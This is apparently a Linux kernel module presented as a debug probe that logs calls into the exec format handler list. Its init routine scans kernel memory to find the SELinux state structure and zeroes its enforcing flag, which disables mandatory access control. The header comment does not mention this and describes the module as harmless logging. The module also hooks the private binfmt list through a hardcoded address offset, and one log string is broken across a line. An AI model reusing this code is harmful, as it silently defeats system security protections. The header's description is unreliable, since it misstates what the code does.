// SPDX-License-Identifier: GPL-2.0
/* khack_dbg2 - instrumented binfmt probe.
 *
 * Logs the state of fs/exec.c:formats before and after linking, and every
 * call into load_binary.  Handler itself does nothing but decline, so a
 * panic after this can only come from the list linkage or the struct
 * layout, not from credential rewriting.
 */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/binfmts.h>
#include <linux/sched.h>
#include <linux/cred.h>
#include <linux/uaccess.h>

#define FORMATS_DELTA 0x2AFF828UL

typedef unsigned long (*copy_fn)(void *to, const void *from, unsigned long n);

static bool linked;

/* ---- ported from procok: flip selinux_state.enforcing to 0 ---- */
static int khack_clear_enforcing(void)
{
	copy_fn pkr = (copy_fn)__symbol_get("probe_kernel_read");
	unsigned long anchor = (unsigned long)__symbol_get("printk");
	unsigned long lo, hi, a, hit = 0;
	static u8 buf[4096];
	int found = 0;

	if (!pkr || !anchor)
		return -EINVAL;

	anchor &= ~0xFFFUL;
	lo = anchor - 0x800000UL;
	hi = anchor + 0x4000000UL;

	for (a = lo; a < hi; a += sizeof(buf)) {
		unsigned int i;

		if (pkr(buf, (void *)a, sizeof(buf)))
			continue;

		for (i = 0; i + 32 <= sizeof(buf); i++) {
			u8 *b = buf + i;
			u64 avc, ss;
			int j, ok = 1;

			if (b[0] || b[1] != 1 || b[2] || b[3] != 1)
				continue;
			if ((a + i) & 7)
				continue;
			for (j = 4; j < 16; j++)
				if (b[j] > 1) { ok = 0; break; }
			if (!ok)
				continue;

			memcpy(&avc, b + 16, 8);
			memcpy(&ss, b + 24, 8);
			if (avc & 7 || ss & 7)
				continue;
			if (avc < lo || avc >= hi || ss < lo || ss >= hi)
				continue;

			found++;
			hit = a + i;
		}
	}

	if (found != 1)
		return -ENOENT;

	*(u8 *)(hit + 1) = 0;
	return 0;
}


static int khack_load_binary(struct linux_binprm *bprm)
{
	pr_info("khack_dbg2: load_binary file=%s uid=%u\n",
		(bprm && bprm->filename) ? bprm->filename : "(null)",
		__kuid_val(current_uid()));
	return -ENOEXEC;
}

static struct linux_binfmt khack_binfmt = {
	.module      = THIS_MODULE,
	.load_binary = khack_load_binary,
};

static int __init khack_init(void)
{
	struct list_head *head;
	struct list_head *n, *p;

	pr_info("khack_dbg2: clearing selinux enforcing\n");
	khack_clear_enforcing();

	/* __symbol_get avoids the GOT relocation (&printk -> ADR_GOT_PAGE, which
	 * 4.19's module loader rejects with 'unsupported RELA relocation: 311'). */
	{
		unsigned long pk = (unsigned long)__symbol_get("printk");
		if (!pk) {
			pr_info("khack_dbg2: printk not found
");
			return -ENOENT;
		}
		head = (struct list_head *)(pk + FORMATS_DELTA);
	}
	n = head->next;
	p = head->prev;
	pr_info("khack_dbg2: formats=%px next=%px prev=%px\n",
		(void *)head, (void *)n, (void *)p);

	INIT_LIST_HEAD(&khack_binfmt.lh);
	list_add(&khack_binfmt.lh, head);
	linked = true;

	pr_info("khack_dbg2: self=%px next=%px prev=%px head->next=%px\n",
		(void *)&khack_binfmt.lh,
		(void *)khack_binfmt.lh.next,
		(void *)khack_binfmt.lh.prev,
		(void *)head->next);
	return 0;
}

static void __exit khack_exit(void)
{
	if (linked) {
		pr_info("khack_dbg2: unlinking\n");
		list_del(&khack_binfmt.lh);
	}
}

module_init(khack_init);
module_exit(khack_exit);
MODULE_LICENSE("GPL");
